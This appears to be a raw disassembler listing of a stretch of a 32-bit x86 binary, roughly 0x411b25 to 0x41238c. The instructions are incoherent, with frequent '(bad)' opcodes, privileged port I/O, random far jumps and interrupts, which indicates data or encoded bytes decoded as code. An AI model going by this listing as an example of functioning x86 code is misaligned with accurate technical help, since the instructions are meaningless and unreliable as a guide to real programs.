  411b25:	fsub   st(2),st
  411b27:	lock mov bl,0xc6
  411b2a:	out    dx,eax
  411b2b:	lock sti 
  411b2d:	fdivr  DWORD PTR [edi-0xe004303]
  411b33:	jecxz  0x411afc
  411b35:	(bad)  
  411b36:	lock rcr cl,0xe6
  411b3a:	jecxz  0x411b11
  411b3c:	clc    
  411b3d:	fldpi  
  411b3f:	fimul  WORD PTR [edx]
  411b41:	out    dx,al
  411b42:	jecxz  0x411b2d
  411b44:	mul    esp
  411b46:	mov    esp,0xe0ece6f0
  411b4b:	jmp    0xd5ee:0xf3efe8d6
  411b52:	fdiv   st(0),st
  411b54:	hlt    
  411b55:	(bad)  
  411b56:	mov    esp,0xbdbc204
  411b5b:	out    dx,al
  411b5c:	push   es
  411b5d:	loopne 0x411b4e
  411b5f:	out    dx,eax
  411b60:	ror    dl,0xd3
  411b63:	int3   
  411b64:	shl    DWORD PTR [ebx-0x2d131649],0xdf
  411b6b:	test   edx,0xd0c3eed0
  411b71:	mov    bh,0xb8
  411b73:	pop    es
  411b74:	fcmovnb st,st(3)
  411b76:	mov    ebp,0xd0d5c4f7
  411b7b:	add    al,0xd4
  411b7d:	out    0xef,eax
  411b7f:	enter  0xebe0,0xcc
  411b83:	loop   0x411b5a
  411b85:	ror    ah,0xad
  411b88:	hlt    
  411b89:	mov    dh,0xce
  411b8b:	out    0xf0,al
  411b8d:	mov    dh,0xb4
  411b8f:	add    ch,ch
  411b91:	jecxz  0x411b67
  411b93:	fadd   DWORD PTR [ecx]
  411b95:	out    0xeb,eax
  411b97:	test   ah,0xf0
  411b9a:	add    al,0xf7
  411b9c:	fadd   QWORD PTR [edi]
  411b9e:	in     al,0xfe
  411ba0:	add    eax,0xeab2d8e8
  411ba5:	iret   
  411ba6:	jmp    0xce2cea92
  411bab:	stc    
  411bac:	enter  0xe8b9,0xb5
  411bb0:	add    al,cl
  411bb2:	out    0xe7,eax
  411bb4:	mov    ah,0xbf
  411bb6:	aad    0xf6
  411bb8:	push   es
  411bb9:	(bad)  
  411bba:	fstp   st(0)
  411bbc:	out    0xb,eax
  411bbe:	cli    
  411bbf:	fst    QWORD PTR [ecx]
  411bc1:	ret    
  411bc2:	mov    al,0xdf
  411bc4:	out    dx,al
  411bc5:	scas   eax,DWORD PTR es:[edi]
  411bc6:	int    0xf6
  411bc8:	in     eax,dx
  411bc9:	jmp    0xef2c0cad
  411bce:	xlat   BYTE PTR ds:[ebx]
  411bcf:	mov    ebx,0xf4bef3dc
  411bd4:	jecxz  0x411b9d
  411bd6:	sti    
  411bd7:	(bad)  
  411bd8:	hlt    
  411bd9:	dec    DWORD PTR [eax]
  411bdb:	jmp    0xee501ba4
  411be0:	or     ch,BYTE PTR [ebp-0x352d483f]
  411be6:	fsub   st(3),st
  411be8:	retf   0xccc8
  411beb:	fbstp  TBYTE PTR [ebp+edi*4-0x1f3d3106]
  411bf2:	div    ecx
  411bf4:	(bad)  
  411bf6:	jmp    0x411bba
  411bf8:	mov    esp,0xfee8e5eb
  411bfd:	les    eax,FWORD PTR ds:0xc9d20c13
  411c03:	test   al,0xd7
  411c05:	scas   al,BYTE PTR es:[edi]
  411c06:	shr    edx,0xca
  411c09:	scas   eax,DWORD PTR es:[edi]
  411c0a:	shl    ebp,cl
  411c0c:	fidivr WORD PTR [edi-0x3e3c30fd]
  411c12:	mov    dh,0xda
  411c14:	fdivr  DWORD PTR [esp+eax*8-0xfc3915]
  411c1b:	jecxz  0x411bf3
  411c1d:	add    edi,ebp
  411c1f:	(bad)  
  411c21:	fsubp  st(2),st
  411c23:	fsub   st(1),st
  411c25:	(bad)
  411c28:	jmp    0xf4120226
  411c2d:	mov    bl,0xbb
  411c2f:	in     eax,dx
  411c30:	ret    0xbdbf
  411c33:	repz ret 
  411c35:	fmul   DWORD PTR [ebx]
  411c37:	icebp  
  411c38:	(bad)  
  411c3a:	(bad)  
  411c3c:	(bad)  
  411c3d:	out    0x6,al
  411c3f:	(bad)  
  411c41:	jmp    0xc5b6:0xd4c4c6af
  411c48:	xlat   BYTE PTR ds:[ebx]
  411c49:	loope  0x411c33
  411c4b:	int    0xcc
  411c4d:	sti    
  411c4e:	fdivrp st(3),st
  411c50:	sar    BYTE PTR [edx-0x2825080f],cl
  411c56:	ret    0x6ff
  411c59:	retf   0xd4c0
  411c5c:	cli    
  411c5d:	or     al,0xcf
  411c5f:	retf   
  411c60:	add    al,0xeb
  411c62:	jmp    0x411c4e
  411c64:	in     eax,dx
  411c65:	ret    
  411c66:	sti    
  411c67:	loope  0x411c5a
  411c69:	shl    DWORD PTR [ecx-0x15454411],0xf1
  411c70:	loop   0x411c6d
  411c72:	pop    es
  411c73:	sar    BYTE PTR [esi-0x282f240c],cl
  411c79:	(bad)  
  411c7a:	les    ecx,FWORD PTR [esi]
  411c7c:	fmulp  st(3),st
  411c7e:	jmp    0x411c93
  411c80:	in     al,dx
  411c81:	int    0xb8
  411c83:	retf   
  411c84:	jmp    0x411c53
  411c86:	into   
  411c87:	out    dx,eax
  411c88:	shl    ebp,cl
  411c8a:	hlt    
  411c8b:	aad    0xd2
  411c8d:	clc    
  411c8e:	jecxz  0x411c41
  411c90:	jecxz  0x411c7b
  411c92:	hlt    
  411c93:	loop   0x411c5c
  411c95:	fucomip st,st(3)
  411c97:	(bad)  
  411c98:	(bad)  
  411c9a:	shl    bh,1
  411c9c:	sti    
  411c9d:	push   esp
  411c9f:	sti    
  411ca0:	fucom  st(5)
  411ca2:	out    0xe1,al
  411ca4:	cmc    
  411ca5:	stos   DWORD PTR es:[edi],eax
  411ca6:	out    dx,al
  411ca7:	ret    
  411ca8:	iret   
  411ca9:	mov    ecx,0xcbf7dfc0
  411cae:	(bad)  
  411caf:	mov    ch,0xcd
  411cb1:	repnz cli 
  411cb3:	repz loopne 0x411ca8
  411cb6:	in     al,0xbc
  411cb8:	jecxz  0x411c8f
  411cba:	out    0xfc,al
  411cbc:	or     eax,0xf9010dc9
  411cc1:	jecxz  0x411cb4
  411cc3:	fucomp st(7)
  411cc5:	mov    ch,0xf4
  411cc7:	retf   0xb3ec
  411cca:	lock out 0xcb,eax
  411ccd:	idiv   BYTE PTR [ebp-0x173e4308]
  411cd3:	sti    
  411cd4:	fmulp  st(5),st
  411cd6:	in     eax,0xeb
  411cd8:	shl    ch,cl
  411cda:	loopne 0x411cc3
  411cdc:	fxch   st(2)
  411cde:	fiadd  DWORD PTR [esi]
  411ce0:	fisubr WORD PTR [edi+ecx*8-0x49091b0e]
  411ce7:	mov    ch,0xd3
  411ce9:	stc    
  411cea:	repnz cli 
  411cec:	jmp    0x411cd8
  411cee:	test   ebp,0xfcbabcd4
  411cf4:	mov    esp,0xe6ddc6c7
  411cf9:	(bad)  
  411cfa:	out    dx,eax
  411cfb:	out    0xd5,al
  411cfd:	pop    es
  411cfe:	aam    0xcc
  411d00:	add    bl,bh
  411d02:	out    dx,eax
  411d03:	jmp    0xbbba:0xf4c8c5dd
  411d0a:	in     eax,dx
  411d0b:	cli    
  411d0c:	shl    bh,1
  411d0e:	not    ecx
  411d10:	sar    BYTE PTR [ebx-0x3a400e27],1
  411d16:	test   DWORD PTR [edx],0xded8fbd6
  411d1c:	add    dh,bl
  411d1e:	(bad)  
  411d20:	cli    
  411d21:	shl    DWORD PTR [edx-0x432b4334],1
  411d27:	in     eax,dx
  411d28:	repz aad 0xc7
  411d2b:	hlt    
  411d2c:	(bad)  
  411d2d:	fcomip st,st(2)
  411d2f:	mov    eax,0xdbcce2f0
  411d34:	add    eax,edx
  411d36:	hlt    
  411d37:	rol    BYTE PTR [ecx],cl
  411d39:	jmp    0xc94c0026
  411d3e:	or     esp,eax
  411d40:	shr    edi,cl
  411d42:	fcomip st,st(7)
  411d44:	out    0xe6,al
  411d46:	out    dx,eax
  411d47:	aam    0xe7
  411d49:	into   
  411d4a:	shl    esp,cl
  411d4c:	fcomip st,st(0)
  411d4e:	(bad)  
  411d50:	mov    edi,0x5b9dfe2
  411d55:	(bad)  
  411d56:	rol    DWORD PTR [edi+ebx*8],cl
  411d59:	ret    0xdadb
  411d5c:	stc    
  411d5d:	std    
  411d5e:	jmp    0xccef:0xc1ce08db
  411d65:	shr    edx,1
  411d67:	test   eax,0xfacdb9e6
  411d6c:	fcomp  st(5)
  411d6e:	mov    eax,0xf0e8ffc8
  411d73:	int    0xf3
  411d75:	ret    
  411d76:	fadd   DWORD PTR ds:0xc4fa0b
  411d7c:	dec    cl
  411d7e:	jmp    0xcbf02b50
  411d83:	int3   
  411d84:	iret   
  411d85:	mov    cl,0xf2
  411d87:	jmp    0xb82be862
  411d8c:	cli    
  411d8d:	mov    dh,0xd3
  411d8f:	iret   
  411d90:	clc    
  411d91:	sti    
  411d92:	repz aam 0xf4
  411d95:	loope  0x411d8f
  411d97:	mov    ecx,0xdde4f8da
  411d9d:	(bad)  
  411d9e:	fisttp DWORD PTR ds:0xe3e6d305
  411da4:	fsubr  st(2),st
  411da6:	mov    ch,0xea
  411da8:	shr    edx,cl
  411daa:	sar    DWORD PTR [ecx-0x31120c],cl
  411db0:	aam    0xe8
  411db2:	(bad)  
  411db4:	in     eax,dx
  411db5:	int3   
  411db6:	fcmovbe st,st(6)
  411db8:	fild   DWORD PTR [eax]
  411dba:	ror    DWORD PTR [ecx],0xfc
  411dbd:	stc    
  411dbe:	clc    
  411dbf:	(bad)  
  411dc0:	fisubr DWORD PTR [edi-0x3f41434d]
  411dc6:	sar    BYTE PTR [ebx-0x40170e29],cl
  411dcc:	mov    eax,0xfccfbbdd
  411dd1:	mov    bh,0xd5
  411dd3:	repz cmc 
  411dd5:	ffreep st(6)
  411dd7:	hlt    
  411dd8:	loopne 0x411da3
  411dda:	neg    dh
  411ddc:	fcomp  st(2)
  411dde:	hlt    
  411ddf:	fmulp  st(5),st
  411de1:	scas   al,BYTE PTR es:[edi]
  411de2:	rcr    bh,cl
  411de4:	scas   eax,DWORD PTR es:[edi]
  411de5:	fsubr  QWORD PTR [ebp-0x2718184c]
  411deb:	(bad)  
  411dec:	xlat   BYTE PTR ds:[ebx]
  411ded:	jmp    0x411df2
  411def:	mov    edx,0xfbc1dff3
  411df4:	add    edx,ebx
  411df6:	mov    edx,0xe3e7e9fa
  411dfb:	cli    
  411dfc:	out    dx,eax
  411dfd:	add    cl,BYTE PTR [ebx]
  411dff:	std    
  411e00:	fabs   
  411e02:	mov    esp,0xb4e8e6be
  411e07:	fstp   TBYTE PTR [ebx-0x39241b25]
  411e0d:	stc    
  411e0e:	(bad)  
  411e10:	fadd   DWORD PTR [eax]
  411e12:	cld    
  411e13:	shl    ebx,0xda
  411e16:	imul   ebx
  411e18:	add    bl,dh
  411e1a:	ret    0xcee8
  411e1d:	or     cl,cl
  411e1f:	fmul   st(1),st
  411e21:	mov    ebp,0xedd6ecaf
  411e26:	fneni(8087 only) 
  411e28:	icebp  
  411e29:	icebp  
  411e2a:	mov    cl,0xdb
  411e2c:	in     eax,dx
  411e2d:	in     eax,dx
  411e2e:	cmc    
  411e2f:	int    0xf8
  411e31:	add    bl,ah
  411e33:	mov    esi,0xebc4c5f1
  411e38:	retf   
  411e39:	fdivp  st(4),st
  411e3b:	add    BYTE PTR [eax],cl
  411e3d:	retf   0xede8
  411e40:	pop    es
  411e41:	stos   DWORD PTR es:[edi],eax
  411e42:	mov    eax,0xf5e2ebeb
  411e47:	in     eax,0xe8
  411e49:	rcl    dl,cl
  411e4b:	(bad)  
  411e4c:	retf   
  411e4d:	mov    ah,0xb2
  411e4f:	aam    0xf1
  411e51:	add    dh,dh
  411e53:	aad    0xdb
  411e55:	add    al,0x4
  411e57:	rol    dl,0x1
  411e5a:	cmc    
  411e5b:	jecxz  0x411e4a
  411e5d:	loopne 0x411e6e
  411e5f:	jmp    0xcef2:0xb2eaad0f
  411e66:	shr    edx,cl
  411e68:	loopne 0x411e3b
  411e6a:	int    0xc5
  411e6c:	(bad)  
  411e6e:	jmp    0x411e6b
  411e70:	mov    al,0xdc
  411e72:	(bad)  
  411e74:	mov    esp,0xc702f6f4
  411e79:	cld    
  411e7a:	add    dl,dh
  411e7c:	(bad)  
  411e7d:	fyl2xp1 
  411e7f:	into   
  411e80:	push   es
  411e81:	repnz out dx,al
  411e83:	rcr    esi,0xce
  411e86:	hlt    
  411e87:	lods   eax,DWORD PTR ds:[esi]
  411e88:	shl    ah,cl
  411e8a:	int    0xad
  411e8c:	mov    ebx,0xc9b9d0da
  411e91:	mov    edx,0xf6e3bc03
  411e96:	fcmovnb st,st(4)
  411e98:	in     eax,0xe1
  411e9a:	push   es
  411e9b:	retf   0xece
  411e9e:	push   cs
  411e9f:	add    bl,cl
  411ea1:	scas   al,BYTE PTR es:[edi]
  411ea2:	icebp  
  411ea3:	lock jmp 0xe4b1:0xb6eaf4d5
  411eab:	rcr    bl,1
  411ead:	out    dx,al
  411eae:	mov    esi,0xb6efdfca
  411eb3:	shl    eax,0x6
  411eb6:	aad    0xf7
  411eb8:	pop    es
  411eb9:	std    
  411eba:	or     bh,bl
  411ebc:	or     esi,ebx
  411ebe:	fisttp QWORD PTR [edx]
  411ec0:	ror    bh,cl
  411ec2:	jmp    0xcbefe095
  411ec7:	xlat   BYTE PTR ds:[ebx]
  411ec8:	in     eax,0xb5
  411eca:	shl    esi,1
  411ecc:	jmp    0x411eab
  411ece:	fdiv   st,st(2)
  411ed0:	hlt    
  411ed1:	fucomp st(0)
  411ed3:	mov    esi,0xe0c2d4f2
  411ed8:	cli    
  411ed9:	jecxz  0x411ee3
  411edb:	aad    0x2
  411edd:	(bad)  
  411ede:	retf   
  411edf:	fcmove st,st(0)
  411ee1:	repnz enter 0xf7b0,0xcd
  411ee6:	lods   al,BYTE PTR ds:[esi]
  411ee7:	fidiv  DWORD PTR [eax-0x392b0431]
  411eed:	mov    edx,0xccd603d0
  411ef2:	sti    
  411ef3:	in     eax,dx
  411ef4:	int    0xbd
  411ef6:	div    al
  411ef8:	mov    esp,0xd906c5cb
  411efd:	pmulhw mm3,mm6
  411f00:	or     esp,esi
  411f02:	in     eax,dx
  411f03:	into   
  411f04:	scas   al,BYTE PTR es:[edi]
  411f05:	jmp    0xf1cc:0xdbbbece1
  411f0c:	jmp    0xf01210e9
  411f11:	out    dx,al
  411f12:	(bad)  
  411f14:	shl    esp,0xda
  411f17:	cmc    
  411f18:	inc    DWORD PTR [eax+edx*8]
  411f1b:	add    eax,0xe1dfd507
  411f20:	stc    
  411f21:	mov    eax,0xd0cdddc0
  411f26:	out    dx,al
  411f27:	into   
  411f28:	shr    bl,1
  411f2a:	sti    
  411f2b:	mov    edx,0xdfedc9cf
  411f30:	fninit 
  411f32:	repz fyl2x 
  411f35:	stc    
  411f36:	add    edx,edi
  411f38:	(bad)  
  411f39:	call   0xff430b21
  411f3e:	out    0xc4,eax
  411f40:	inc    ebp
  411f42:	out    0xc7,eax
  411f44:	(bad)  
  411f45:	mov    cl,0xc8
  411f47:	into   
  411f48:	iret   
  411f49:	cmc    
  411f4a:	rcl    ebx,1
  411f4c:	fcomip st,st(5)
  411f4e:	in     eax,dx
  411f4f:	(bad)  
  411f51:	inc    DWORD PTR [edx]
  411f53:	add    eax,DWORD PTR [ebx]
  411f55:	aad    0xe2
  411f57:	repnz rcl ch,cl
  411f5a:	cld    
  411f5b:	or     dl,dh
  411f5d:	push   es
  411f5e:	out    dx,eax
  411f5f:	adc    bl,ch
  411f61:	mov    ebp,0xadd6e5bc
  411f66:	in     eax,dx
  411f67:	aad    0xf4
  411f69:	retf   
  411f6a:	cli    
  411f6b:	in     al,dx
  411f6c:	mov    al,0xb4
  411f6e:	int    0xd1
  411f70:	repz sar dh,cl
  411f73:	mul    edx
  411f75:	sti    
  411f76:	inc    DWORD PTR ds:0xdddbc901
  411f7c:	or     ebx,eax
  411f7e:	jmp    0xc5c6:0xeadcfd0d
  411f85:	shl    cl,cl
  411f87:	leave  
  411f88:	ret    0xb6f5
  411f8b:	in     eax,dx
  411f8c:	mov    dh,0xf5
  411f8e:	iret   
  411f8f:	jmp    0x411f7f
  411f91:	icebp  
  411f92:	out    dx,eax
  411f93:	lock add ebp,esp
  411f96:	in     al,dx
  411f97:	faddp  st(0),st
  411f99:	retf   
  411f9a:	lock clc 
  411f9c:	loop   0x411f8c
  411f9e:	push   es
  411f9f:	push   es
  411fa0:	std    
  411fa1:	mov    bl,0xe8
  411fa3:	out    dx,eax
  411fa4:	out    dx,eax
  411fa5:	loop   0x411f74
  411fa7:	aam    0xd4
  411fa9:	clc    
  411faa:	mov    dh,0xe5
  411fac:	mov    ebx,0xe8f5eaee
  411fb1:	aam    0xe7
  411fb3:	repz stc 
  411fb5:	aad    0xf5
  411fb7:	lds    eax,FWORD PTR [edi]
  411fb9:	in     al,0xe0
  411fbb:	jmp    0xb551ca3
  411fc0:	(bad)  
  411fc1:	rcl    cl,0xae
  411fc4:	scas   al,BYTE PTR es:[edi]
  411fc5:	mov    ch,0xc9
  411fc7:	ror    ebp,1
  411fc9:	jmp    0xefd3:0xddddf3ef
  411fd0:	lock out dx,al
  411fd2:	(bad)  
  411fd4:	int3   
  411fd5:	add    eax,0xd8fdc5fd
  411fda:	loop   0x411fa2
  411fdc:	idiv   dl
  411fde:	clc    
  411fdf:	in     al,0xf1
  411fe1:	mov    ecx,0xaec4e1ac
  411fe6:	mov    al,0xe1
  411fe8:	out    0xd3,al
  411fea:	fcomi  st,st(6)
  411fec:	neg    bl
  411fee:	mov    edi,0xc0d6ddc9
  411ff3:	mov    ecx,0xd7f606ff
  411ff8:	add    al,ah
  411ffa:	in     al,0x5
  411ffc:	out    0x9,eax
  411ffe:	stc    
  411fff:	iret   
  412000:	cli    
  412001:	mov    esi,0xf6f2cbee
  412006:	ret    0xecf2
  412009:	retf   
  41200a:	mov    ch,0xf0
  41200c:	(bad)  
  41200d:	icebp  
  41200e:	in     al,dx
  41200f:	test   edi,0xfed9d2be
  412015:	mov    ebx,0xe507f1d2
  41201a:	or     ch,al
  41201c:	jmp    0xe8c9:0x906e0dc
  412023:	scas   al,BYTE PTR es:[edi]
  412024:	int    0xc6
  412026:	mov    bh,0xec
  412028:	mov    dh,0xb7
  41202a:	int3   
  41202b:	enter  0xd6da,0xcd
  41202f:	aam    0xec
  412031:	jecxz  0x412021
  412033:	int    0xdd
  412035:	push   es
  412036:	out    0xcb,al
  412038:	lock jmp 0x412005
  41203b:	push   es
  41203c:	mul    al
  41203e:	(bad)  
  41203f:	fucomi st,st(1)
  412041:	loope  0x41200e
  412043:	out    dx,al
  412044:	loopne 0x411ff9
  412046:	hlt    
  412047:	repnz mov bl,0xd4
  41204a:	mov    dl,0xb1
  41204c:	(bad)  
  41204e:	aad    0xdb
  412050:	fld    DWORD PTR [eax]
  412052:	(bad)  
  412053:	fdiv   st(0),st
  412055:	(bad)  
  412056:	(bad)  
  412058:	add    ebx,esp
  41205a:	out    0xea,eax
  41205c:	shr    cl,0xc8
  41205f:	out    dx,eax
  412060:	cld    
  412061:	shr    BYTE PTR [ecx-0x482a083a],1
  412067:	shl    BYTE PTR [ecx-0xb4b0811],0xb4
  41206e:	icebp  
  41206f:	icebp  
  412070:	shr    cl,1
  412072:	test   DWORD PTR [edi],0xea06f0f5
  412078:	cld    
  412079:	fld    DWORD PTR [eax]
  41207b:	lds    eax,FWORD PTR ds:0xe90ce4de
  412081:	shl    al,cl
  412083:	repnz shl ebp,cl
  412086:	jmp    0x412048
  412088:	leave  
  412089:	leave  
  41208a:	mov    ebx,0xddcfc8b8
  41208f:	in     eax,dx
  412090:	in     eax,dx
  412091:	ret    
  412092:	add    bh,cl
  412094:	fsub   st,st(0)
  412096:	stc    
  412097:	add    dl,cl
  412099:	add    edi,ebx
  41209b:	(bad)  
  41209c:	fiadd  WORD PTR [edi]
  41209e:	loop   0x41209e
  4120a0:	jmp    0x41207b
  4120a2:	loope  0x41208f
  4120a4:	(bad)  
  4120a5:	out    0xe5,eax
  4120a7:	out    0xc0,al
  4120a9:	aam    0xf9
  4120ab:	int    0xeb
  4120ad:	clc    
  4120ae:	repz jmp 0xd53d0d68
  4120b4:	(bad)  
  4120b5:	fdivr  st(5),st
  4120b7:	ret    0xe1e1
  4120ba:	push   es
  4120bb:	out    0xe,eax
  4120bd:	or     eax,DWORD PTR [ebx+esi*8]
  4120c0:	int    0xc6
  4120c2:	iret   
  4120c3:	in     eax,dx
  4120c4:	lock imul esp
  4120c7:	jmp    0xe03be9bf
  4120cc:	fstp   st(2)
  4120ce:	cli    
  4120cf:	cld    
  4120d0:	cli    
  4120d1:	mov    ecx,0xd5f5d7d6
  4120d6:	loop   0x4120c8
  4120d8:	bnd call 0xcd4d1cd9
  4120de:	(bad)  
  4120e0:	inc    edx
  4120e2:	mov    edi,0xf3b3ccb2
  4120e7:	lods   eax,DWORD PTR ds:[esi]
  4120e8:	repnz imul bh
  4120eb:	hlt    
  4120ec:	(bad)  
  4120ed:	(bad)  
  4120ee:	cld    
  4120ef:	fnstsw WORD PTR [esi-0x3f3d1246]
  4120f5:	loopne 0x4120f3
  4120f7:	stc    
  4120f8:	cld    
  4120f9:	jmp    0x4120f1
  4120fb:	clc    
  4120fc:	call   0xf9062e0b
  412101:	repz lock (bad) 
  412104:	mov    bl,0xf3
  412106:	(bad)
  412109:	stc    
  41210a:	lock test cl,0xcb
  41210e:	retf   
  41210f:	jmp    0x412109
  412111:	stc    
  412112:	rol    al,1
  412114:	(bad)  
  412115:	loop   0x4120d4
  412117:	lock retf 
  412119:	add    eax,0x8dafae2
  41211e:	retf   0xe3f9
  412121:	lock loop 0x4120e1
  412124:	retf   0xb3b6
  412127:	imul   dh
  412129:	out    0xff,eax
  41212b:	mov    ecx,0x3bab9b7
  412130:	add    ecx,ebp
  412132:	cli    
  412133:	add    dl,al
  412135:	fdivrp st(0),st
  412137:	clc    
  412138:	in     eax,0x3
  41213a:	jmp    0xcb00:0xe7cde9e2
  412141:	out    dx,eax
  412142:	into   
  412143:	jmp    0xd5f0:0xe2f7d2f3
  41214a:	into   
  41214b:	(bad)  
  41214c:	mov    ch,0xcb
  41214e:	in     al,dx
  41214f:	retf   0xb9e9
  412152:	pop    es
  412153:	loop   0x412113
  412155:	aam    0xf5
  412157:	cmc    
  412158:	out    0xca,al
  41215a:	cmc    
  41215b:	retf   0xfad4
  41215e:	loope  0x412121
  412160:	in     al,0xd1
  412162:	mov    esp,0xd3d3e8cc
  412167:	(bad)  
  412168:	icebp  
  412169:	int3   
  41216a:	repnz aad 0xd5
  41216d:	hlt    
  41216e:	mov    esp,0xfcf4ddd7
  412173:	clc    
  412174:	add    ch,bl
  412176:	in     eax,0xb9
  412178:	clc    
  412179:	loop   0x412143
  41217b:	(bad)  
  41217d:	fdivp  st(0),st
  41217f:	add    eax,0xc4e0cdcd
  412184:	xlat   BYTE PTR ds:[ebx]
  412185:	out    dx,al
  412186:	shl    al,cl
  412188:	out    0xc9,eax
  41218a:	jmp    0xf5211567
  41218f:	mov    ah,0xfa
  412191:	fdivr  st(1),st
  412193:	int3   
  412194:	(bad)  
  412195:	add    ebx,esp
  412197:	repnz rcr eax,0x2
  41219b:	(bad)
  41219e:	add    cl,ch
  4121a0:	loop   0x412194
  4121a2:	mov    cl,0xf1
  4121a4:	out    0xe3,eax
  4121a6:	stos   BYTE PTR es:[edi],al
  4121a7:	enter  0xcde1,0xd2
  4121ab:	(bad)  
  4121ac:	lods   al,BYTE PTR ds:[esi]
  4121ad:	mov    bh,0xbd
  4121af:	mov    esi,0xcce0e0de
  4121b4:	mov    esi,0xcae5e4f7
  4121b9:	(bad)  
  4121ba:	retf   
  4121bb:	(bad)  
  4121bc:	loopne 0x4121ac
  4121be:	cli    
  4121bf:	cli    
  4121c0:	(bad)  [esi-0x3c093f3d]
  4121c6:	ret    
  4121c7:	ret    0xd5c9
  4121ca:	(bad)  
  4121cb:	fmulp  st(2),st
  4121cd:	mov    edx,0xd2f8edbf
  4121d2:	into   
  4121d3:	fstp   st(0)
  4121d5:	(bad)  
  4121d6:	aad    0xe0
  4121d8:	aad    0x2
  4121da:	sti    
  4121db:	call   0xe427fbc1
  4121e0:	in     al,dx
  4121e1:	ret    0xc2e4
  4121e4:	shl    BYTE PTR [edx-0x2a2f1116],cl
  4121ea:	rcr    esi,1
  4121ec:	sar    DWORD PTR [ebx-0x471c0504],cl
  4121f2:	fcomip st,st(4)
  4121f4:	push   edx
  4121f6:	rcr    eax,0xff
  4121f9:	call   0xcf192cbc
  4121fe:	int3   
  4121ff:	into   
  412200:	add    ebp,DWORD PTR [esp+eax*8-0x24085733]
  412207:	lods   eax,DWORD PTR ds:[esi]
  412208:	mov    edx,0xe5bbb1eb
  41220d:	int    0xf3
  41220f:	leave  
  412210:	fdivrp st(5),st
  412212:	ret    
  412213:	add    esi,esp
  412215:	in     eax,dx
  412216:	shl    esp,0xf2
  412219:	fcomp  st(5)
  41221b:	add    esp,esi
  41221d:	jmp    0xf7d7:0xab0000e1
  412224:	call   0xdc3415f1
  412229:	shr    eax,1
  41222b:	mov    ecx,0xbcf1c5b8
  412230:	leave  
  412231:	jmp    0xdb021d25
  412236:	ret    0x5fd
  412239:	rcl    esp,1
  41223b:	sti    
  41223c:	add    dl,ah
  41223e:	in     al,dx
  41223f:	in     eax,0xe9
  412241:	rcl    ebx,1
  412243:	(bad)  
  412244:	int    0xe2
  412246:	rol    bl,1
  412248:	icebp  
  412249:	out    dx,eax
  41224a:	icebp  
  41224b:	(bad)
  41224e:	mov    dh,0xfc
  412250:	fmulp  st(0),st
  412252:	cmc    
  412253:	cli    
  412254:	sti    
  412255:	rol    esp,1
  412257:	out    0xf2,al
  412259:	xlat   BYTE PTR ds:[ebx]
  41225a:	cld    
  41225b:	xlat   BYTE PTR ds:[ebx]
  41225c:	(bad)  [ebx]
  41225e:	add    al,0xfc
  412260:	in     eax,0xe4
  412262:	mov    esi,0xcff2d2ed
  412267:	jmp    0xb3f0:0xf7b8d1f1
  41226e:	fdivr  QWORD PTR [ebx-0x2a3c171d]
  412274:	div    ch
  412276:	(bad)  
  412278:	mov    esp,0xe7f6faf7
  41227d:	jmp    0xb0c6:0xc30805df
  412284:	repnz (bad) 
  412286:	fsub   st(7),st
  412288:	mov    ch,0xd6
  41228a:	int    0xcb
  41228c:	cmc    
  41228d:	jmp    0x41224d
  41228f:	out    dx,eax
  412290:	icebp  
  412291:	out    dx,eax
  412292:	pop    es
  412293:	out    dx,eax
  412294:	mov    esp,0x907c5d6
  412299:	icebp  
  41229a:	test   cl,0xd5
  41229d:	int    0xe0
  41229f:	or     al,BYTE PTR [edi+ecx*8]
  4122a2:	jmp    0xc40eeb73
  4122a7:	rcr    ebx,cl
  4122a9:	in     eax,0xe7
  4122ab:	stc    
  4122ac:	dec    edi
  4122ae:	xlat   BYTE PTR ds:[ebx]
  4122af:	add    ecx,esp
  4122b1:	call   edx
  4122b3:	faddp  st(0),st
  4122b5:	shl    ebp,cl
  4122b7:	(bad)  
  4122b8:	sar    bh,cl
  4122ba:	fadd   DWORD PTR [ecx]
  4122bc:	loop   0x4122bf
  4122be:	hlt    
  4122bf:	loope  0x4122a2
  4122c1:	mov    esp,0xebddafc6
  4122c6:	imul   bh
  4122c8:	rcl    edx,1
  4122ca:	stc    
  4122cb:	mov    al,0xf4
  4122cd:	(bad)  
  4122ce:	jmp    0xdb3d16bb
  4122d3:	sar    eax,cl
  4122d5:	clc    
  4122d6:	clc    
  4122d7:	idiv   ebx
  4122d9:	fiadd  DWORD PTR [edi]
  4122db:	call   0xf2704c1
  4122e0:	icebp  
  4122e1:	mov    dl,0xa9
  4122e3:	test   eax,0xf5b7c0ee
  4122e8:	out    dx,al
  4122e9:	in     eax,0xb2
  4122eb:	mov    eax,0xe2e9d9ef
  4122f0:	repnz std 
  4122f2:	shl    bh,cl
  4122f4:	test   BYTE PTR [ecx],0xba
  4122f7:	or     esp,edx
  4122f9:	imul   cl
  4122fb:	fild   DWORD PTR [edi+eiz*8]
  4122fe:	add    dl,ch
  412300:	rcr    edi,cl
  412302:	rol    ah,0xd3
  412305:	ror    dl,1
  412307:	(bad)  
  412309:	fdiv   st,st(1)
  41230b:	int3   
  41230c:	(bad)  
  41230d:	cli    
  41230e:	mov    eax,0xd900cad9
  412313:	loope  0x412312
  412315:	fild   WORD PTR [edi]
  412317:	retf   
  412318:	(bad)  
  412319:	cmc    
  41231a:	push   es
  41231b:	call   0xc4e041b
  412320:	out    dx,al
  412321:	mov    bl,0xb0
  412323:	scas   al,BYTE PTR es:[edi]
  412324:	call   0xc534071c
  412329:	not    dl
  41232b:	(bad)  
  41232c:	mov    ebx,0xd3dfdfca
  412331:	cld    
  412332:	jecxz  0x412331
  412334:	int    0xd5
  412336:	rcr    bh,1
  412338:	add    eax,0xe205d0eb
  41233d:	clc    
  41233e:	pop    es
  41233f:	fsubr  st(2),st
  412341:	mov    dl,0xaf
  412343:	jmp    0xd2181917
  412348:	int    0xb6
  41234a:	fidiv  DWORD PTR [eax-0x2a161550]
  412350:	mov    esi,0xf7d8c8bb
  412355:	fnstcw WORD PTR [edx-0x1d151c30]
  41235b:	fld    st(5)
  41235d:	sti    
  41235e:	cld    
  41235f:	in     al,0xe4
  412361:	mov    esp,0xf1c1edb3
  412366:	mov    dh,0xcc
  412368:	repnz frstpm(287 only) 
  41236b:	repz (bad) 
  41236d:	mov    esi,0xbffbf1f9
  412372:	fdiv   st(4),st
  412374:	(bad)  
  412376:	lock cld 
  412378:	in     al,0xdc
  41237a:	lds    eax,FWORD PTR [edx]
  41237c:	neg    bh
  41237e:	add    eax,0xa8aaf1e8
  412383:	ror    bl,cl
  412385:	in     al,0xf6
  412387:	out    0xe5,eax
  412389:	out    dx,eax
  41238a:	aad    0xf7
  41238c:	ror    esp,cl
